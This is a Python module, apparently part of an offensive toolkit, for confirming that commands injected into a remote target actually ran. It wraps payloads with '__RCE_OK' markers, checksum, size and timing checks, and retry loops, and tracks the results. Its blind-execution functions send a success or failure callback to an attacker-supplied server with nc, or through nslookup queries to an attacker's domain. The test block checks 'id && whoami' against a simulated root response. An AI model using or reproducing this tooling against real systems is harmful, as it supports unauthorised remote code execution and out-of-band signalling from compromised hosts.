#!/usr/bin/env python3
"""
Command Verification System
Verify that injected commands executed successfully

Techniques:
- Execution markers (start/end tags)
- Checksum verification
- Output size tracking
- Retry logic
- Blind execution verification (timing-based)
"""

import hashlib
import time
from datetime import datetime
from typing import Optional, Dict, Any, Tuple
import threading


class CommandVerifier:
    """Verify command execution and validate output"""
    
    MARKER_START = "__RCE_OK_START__"
    MARKER_END = "__RCE_OK_END__"
    
    @classmethod
    def wrap_with_markers(cls, cmd: str) -> str:
        """
        Wrap command with execution markers.
        
        Args:
            cmd: Shell command to wrap
            
        Returns:
            Wrapped command with markers
        """
        return (
            f"echo '{cls.MARKER_START}' && "
            f"({cmd}) && "
            f"echo '{cls.MARKER_END}' || "
            f"echo 'ERROR: Command failed'"
        )
    
    @classmethod
    def wrap_with_checksum(cls, cmd: str) -> str:
        """
        Wrap command with checksum verification.
        
        Args:
            cmd: Shell command to wrap
            
        Returns:
            Wrapped command with checksum
        """
        return (
            f"HASH=$(echo '{cmd}' | sha256sum | cut -d' ' -f1); "
            f"echo \"CHECKSUM:$HASH\" && "
            f"({cmd})"
        )
    
    @classmethod
    def wrap_with_output_size(cls, cmd: str) -> str:
        """
        Wrap command and report output size.
        
        Args:
            cmd: Shell command to wrap
            
        Returns:
            Wrapped command with size reporting
        """
        return (
            f"OUT=$({cmd}); "
            f"SIZE=$(echo -n \"$OUT\" | wc -c); "
            f"echo \"OUTPUT_SIZE:$SIZE\" && "
            f"echo \"$OUT\""
        )
    
    @classmethod
    def verify_output(cls, output: str) -> Dict[str, Any]:
        """
        Parse and verify output with markers.
        
        Args:
            output: Raw output from command
            
        Returns:
            Dictionary with verification results
        """
        result = {
            "verified": False,
            "executed": cls.MARKER_START in output,
            "completed": cls.MARKER_END in output,
            "output": None,
            "raw_length": len(output),
            "has_error": "ERROR" in output,
            "timestamp": datetime.now().isoformat(),
        }
        
        if cls.MARKER_START in output and cls.MARKER_END in output:
            # Extract output between markers
            start_idx = output.index(cls.MARKER_START) + len(cls.MARKER_START)
            end_idx = output.index(cls.MARKER_END)
            result["output"] = output[start_idx:end_idx].strip()
            result["verified"] = True
            result["output_length"] = len(result["output"])
        
        return result
    
    @classmethod
    def verify_with_checksum(cls, output: str, expected_cmd: str = None) -> Dict[str, Any]:
        """
        Verify output using checksum.
        
        Args:
            output: Raw output from wrapped command
            expected_cmd: Original command (optional)
            
        Returns:
            Verification results
        """
        result = {
            "verified": False,
            "checksum_found": False,
            "checksum": None,
            "expected_checksum": None,
            "match": False,
        }
        
        if "CHECKSUM:" in output:
            parts = output.split("CHECKSUM:", 1)
            checksum_line = parts[1].split('\n', 1)[0]
            result["checksum"] = checksum_line.strip()
            result["checksum_found"] = True
            
            if expected_cmd:
                expected_hash = hashlib.sha256(expected_cmd.encode()).hexdigest()
                result["expected_checksum"] = expected_hash
                result["match"] = result["checksum"] == expected_hash
                result["verified"] = result["match"]
        
        return result
    
    @classmethod
    def verify_with_size(cls, output: str) -> Dict[str, Any]:
        """
        Verify output size reporting.
        
        Args:
            output: Raw output from wrapped command
            
        Returns:
            Verification results
        """
        result = {
            "verified": False,
            "size_found": False,
            "reported_size": None,
            "actual_size": None,
            "size_match": False,
        }
        
        if "OUTPUT_SIZE:" in output:
            parts = output.split("OUTPUT_SIZE:", 1)
            size_line = parts[1].split('\n', 1)[0]
            result["reported_size"] = int(size_line.strip())
            result["size_found"] = True
            
            # Extract actual output after size line
            if '\n' in output:
                actual_output = output.split("OUTPUT_SIZE:", 1)[1].split('\n', 1)[1]
                result["actual_size"] = len(actual_output)
                result["size_match"] = result["reported_size"] == result["actual_size"]
                result["verified"] = result["size_match"]
        
        return result


class BlindExecutionVerifier:
    """
    Verify blind command execution using timing or side-channel analysis.
    Useful when output cannot be directly captured.
    """
    
    @staticmethod
    def timing_based_verification(cmd: str, expected_duration: float) -> str:
        """
        Verify execution by measuring command duration.
        
        Args:
            cmd: Shell command to wrap
            expected_duration: Expected execution time in seconds
            
        Returns:
            Wrapped command with timing verification
        """
        return (
            f"START=$(date +%s%N); "
            f"({cmd}); "
            f"END=$(date +%s%N); "
            f"DURATION=$(( (END - START) / 1000000 )); "
            f"echo \"EXEC_TIME:${{DURATION}}ms\""
        )
    
    @staticmethod
    def file_based_verification(cmd: str, verify_file: str = "/tmp/rce_verify_$$") -> str:
        """
        Verify execution by writing to a file.
        
        Args:
            cmd: Shell command to wrap
            verify_file: File to create/write to
            
        Returns:
            Wrapped command that writes verification file
        """
        return (
            f"({cmd}) > {verify_file}.out 2>&1 && "
            f"echo 'SUCCESS' > {verify_file} || "
            f"echo 'FAILED' > {verify_file}"
        )
    
    @staticmethod
    def network_based_verification(cmd: str, callback_server: str, callback_port: int) -> str:
        """
        Verify execution by sending callback.
        
        Args:
            cmd: Shell command to wrap
            callback_server: Server to contact
            callback_port: Port number
            
        Returns:
            Wrapped command that sends callback
        """
        return (
            f"({cmd}) && "
            f"echo 'RCE_SUCCESS' | nc -w1 {callback_server} {callback_port} || "
            f"echo 'RCE_FAILED' | nc -w1 {callback_server} {callback_port}"
        )
    
    @staticmethod
    def dns_based_verification(cmd: str, dns_domain: str, dns_server: str) -> str:
        """
        Verify execution via DNS query.
        
        Args:
            cmd: Shell command to wrap
            dns_domain: Domain to query
            dns_server: DNS server address
            
        Returns:
            Wrapped command that sends DNS verification
        """
        return (
            f"({cmd}) && "
            f"nslookup success.{dns_domain} {dns_server} > /dev/null || "
            f"nslookup failed.{dns_domain} {dns_server} > /dev/null"
        )


class ExecutionTracker:
    """Track multiple command executions and their results"""
    
    def __init__(self):
        self.executions = []
        self.lock = threading.Lock()
    
    def add_execution(self, cmd: str, output: str = None, status: str = "pending", 
                     error: str = None, metadata: Dict = None) -> int:
        """
        Track command execution.
        
        Args:
            cmd: Command that was executed
            output: Output received (if any)
            status: "pending"|"success"|"failed"
            error: Error message (if failed)
            metadata: Additional metadata
            
        Returns:
            Execution ID for tracking
        """
        execution = {
            "id": len(self.executions),
            "timestamp": datetime.now().isoformat(),
            "cmd": cmd,
            "output": output,
            "status": status,
            "error": error,
            "metadata": metadata or {},
        }
        
        with self.lock:
            self.executions.append(execution)
        
        return execution["id"]
    
    def verify_execution(self, exec_id: int, output: str, method: str = "markers") -> Dict[str, Any]:
        """
        Verify a tracked execution.
        
        Args:
            exec_id: Execution ID to verify
            output: Output to verify
            method: Verification method ("markers"|"checksum"|"size")
            
        Returns:
            Verification results
        """
        with self.lock:
            if exec_id >= len(self.executions):
                return {"error": "Invalid execution ID"}
            
            execution = self.executions[exec_id]
        
        verifier = CommandVerifier()
        
        if method == "markers":
            result = verifier.verify_output(output)
        elif method == "checksum":
            result = verifier.verify_with_checksum(output, execution["cmd"])
        elif method == "size":
            result = verifier.verify_with_size(output)
        else:
            result = {"error": f"Unknown method: {method}"}
        
        result["exec_id"] = exec_id
        
        with self.lock:
            if result.get("verified"):
                execution["status"] = "success"
                execution["output"] = result.get("output")
            else:
                execution["status"] = "failed"
                execution["error"] = "Verification failed"
        
        return result
    
    def get_execution(self, exec_id: int) -> Optional[Dict]:
        """Get tracked execution details"""
        with self.lock:
            if exec_id < len(self.executions):
                return self.executions[exec_id]
        return None
    
    def get_summary(self) -> Dict[str, Any]:
        """Get summary of all tracked executions"""
        with self.lock:
            total = len(self.executions)
            successful = sum(1 for e in self.executions if e["status"] == "success")
            failed = sum(1 for e in self.executions if e["status"] == "failed")
        
        return {
            "total": total,
            "successful": successful,
            "failed": failed,
            "pending": total - successful - failed,
            "success_rate": (successful / total * 100) if total > 0 else 0,
        }


class RetryableExecution:
    """Wrap command execution with retry logic"""
    
    def __init__(self, max_retries: int = 3, backoff_factor: float = 1.5):
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self.attempts = []
    
    def build_retry_wrapper(self, cmd: str, timeout: int = 30) -> str:
        """
        Build a shell script wrapper with retry logic.
        
        Args:
            cmd: Command to wrap
            timeout: Timeout per attempt
            
        Returns:
            Wrapped command with retry logic
        """
        return (
            f"RETRIES=0; "
            f"while [ $RETRIES -lt {self.max_retries} ]; do "
            f"  timeout {timeout} bash -c '{cmd}' && exit 0; "
            f"  RETRIES=$((RETRIES + 1)); "
            f"  [ $RETRIES -lt {self.max_retries} ] && sleep $((RETRIES * {int(self.backoff_factor)})); "
            f"done; "
            f"exit 1"
        )
    
    def log_attempt(self, attempt: int, status: str, error: str = None):
        """Log retry attempt"""
        self.attempts.append({
            "attempt": attempt,
            "timestamp": datetime.now().isoformat(),
            "status": status,
            "error": error,
        })
    
    def get_attempt_history(self) -> list:
        """Get retry attempt history"""
        return self.attempts


class FailureDetection:
    """Detect command execution failures"""
    
    FAILURE_INDICATORS = [
        "command not found",
        "permission denied",
        "segmentation fault",
        "illegal instruction",
        "killed",
        "terminated",
        "error",
        "failed",
        "fatal",
        "panic",
    ]
    
    @staticmethod
    def detect_failure(output: str) -> Tuple[bool, Optional[str]]:
        """
        Detect if output indicates command failure.
        
        Args:
            output: Command output
            
        Returns:
            Tuple of (is_failure, reason)
        """
        output_lower = output.lower()
        
        for indicator in FailureDetection.FAILURE_INDICATORS:
            if indicator in output_lower:
                return True, f"Detected failure indicator: '{indicator}'"
        
        return False, None
    
    @staticmethod
    def get_error_details(output: str) -> Dict[str, Any]:
        """
        Extract error details from output.
        
        Args:
            output: Command output
            
        Returns:
            Extracted error information
        """
        is_failure, reason = FailureDetection.detect_failure(output)
        
        lines = output.split('\n')
        error_lines = [l for l in lines if any(ind in l.lower() for ind in FailureDetection.FAILURE_INDICATORS)]
        
        return {
            "is_failure": is_failure,
            "reason": reason,
            "error_lines": error_lines,
            "first_error": error_lines[0] if error_lines else None,
            "error_count": len(error_lines),
        }


if __name__ == "__main__":
    # Test verification
    print("Command Verification Test")
    print("=" * 60)
    
    # Test 1: Marker verification
    test_cmd = "id && whoami"
    wrapped = CommandVerifier.wrap_with_markers(test_cmd)
    print(f"Wrapped command:\n{wrapped}\n")
    
    # Simulate output
    test_output = f"echo '__RCE_OK_START__' && uid=0(root) gid=0(root) groups=0(root) && __RCE_OK_END__"
    result = CommandVerifier.verify_output(test_output)
    print(f"Verification result: {result}\n")
    
    # Test 2: Failure detection
    failure_output = "bash: nc: command not found\nSegmentation fault"
    is_failure, reason = FailureDetection.detect_failure(failure_output)
    print(f"Failure detection: {is_failure} ({reason})")
    
    # Test 3: Retry wrapper
    retrier = RetryableExecution(max_retries=3)
    retry_cmd = retrier.build_retry_wrapper("curl http://example.com")
    print(f"\nRetry wrapper: {retry_cmd[:80]}...")
    
    # Test 4: Execution tracker
    tracker = ExecutionTracker()
    exec_id = tracker.add_execution("id", status="pending")
    print(f"\nTracked execution ID: {exec_id}")
    print(f"Summary: {tracker.get_summary()}")
